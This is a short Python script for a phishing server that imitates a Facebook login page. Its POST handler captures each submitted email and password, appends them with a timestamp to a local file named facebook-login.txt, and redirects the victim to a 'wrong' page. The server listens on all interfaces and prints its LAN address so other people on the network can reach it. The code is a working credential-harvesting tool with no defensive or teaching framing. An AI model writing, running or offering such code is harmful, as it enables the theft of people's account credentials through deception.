from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
import socket

class LocalFacebookHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path in ('', '/'): 
            self.send_response(302)
            self.send_header('Location', '/login.html')
            self.end_headers()
            return
        return super().do_GET()

    def do_POST(self):
        if self.path == '/login':
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode('utf-8')
            data = parse_qs(body)
            email = data.get('email', [''])[0]
            password = data.get('pass', [''])[0]
            line = f"{datetime.now():%Y-%m-%d %H:%M:%S}\temail={email}\tpassword={password}\n"
            with open('facebook-login.txt', 'a', encoding='utf-8') as file:
                file.write(line)
            self.send_response(303)
            self.send_header('Location', '/wrong.html')
            self.end_headers()
        else:
            self.send_error(404, 'Not Found')

    def log_message(self, format, *args):
        return


def get_host_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(('8.8.8.8', 80))
            return sock.getsockname()[0]
    except Exception:
        return '127.0.0.1'

if __name__ == '__main__':
    port = 8000
    host = '0.0.0.0'
    actual_ip = get_host_ip()
    server = HTTPServer((host, port), LocalFacebookHandler)
    print(f'Serving on http://localhost:{port}/')
    print(f'Accessible from same network at http://{actual_ip}:{port}/')
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\nServer stopped.')
